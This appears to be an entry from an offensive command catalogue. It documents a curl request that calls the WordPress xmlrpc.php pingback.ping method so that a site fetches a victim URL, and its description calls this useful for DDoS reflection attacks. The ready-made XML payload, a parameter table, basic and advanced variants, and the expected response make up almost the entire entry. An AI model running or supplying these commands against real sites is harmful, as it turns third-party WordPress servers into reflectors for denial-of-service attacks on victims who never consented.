---
data: >-
  curl -X POST http://target.com/xmlrpc.php -H "Content-Type: text/xml" -H
  "Accept: */*" -H "Accept-Language: en" -d
  '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/source/</string></value></param><param><value><string>https://victim.com/target/</string></value></param></params></methodCall>'
tags:
  - xmlrpc
  - wordpress
  - ddos
  - pingback
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:37.316Z'
id: c87836c9-6259-4e8a-94b9-63df3c761043
verified: false
validated: true
submitted: true
---
# xmlrpc-pingback-ping

## Command

```bash
curl -X POST http://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -H "Accept: */*" \
  -H "Accept-Language: en" \
  -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/source/</string></value></param><param><value><string>https://victim.com/target/</string></value></param></params></methodCall>'
```

## Description

Invokes the pingback.ping XML-RPC method on WordPress xmlrpc.php to force an outbound HTTP fetch to a victim URL, useful for DDoS reflection attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target.com` | Exploitable WordPress site | Yes |
| `http://attacker.com/source/` | Source URI (fake post on attacker's site) | Yes |
| `https://victim.com/target/` | Victim URI to fetch | Yes |
| `-d '<methodCall>...' ` | XML payload with pingback.ping and params | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://wp-site.com/xmlrpc.php -H "Content-Type: text/xml" -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://source.com/</string></value></param><param><value><string>http://victim.com/</string></value></param></params></methodCall>'
```

### Advanced Usage

With connection close for single requests:

```bash
curl -X POST --connect-timeout 10 http://target.com/xmlrpc.php -H "Connection: close" -H "Content-Type: text/xml" -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/</string></value></param><param><value><string>https://victim.com/</string></value></param></params></methodCall>'
```

## Expected Output

XML response such as:

```xml
<methodResponse><params><param><value><boolean>1</boolean></value></param></params></methodResponse>
```
Or fault if invalid; victim server will log a GET request from the target.

## Related

- [[procedures/Exploit-xmlrpc-php-for-DDoS-via-Pingback]]
- [[procedures/Verify-xmlrpc-php-Endpoint]]
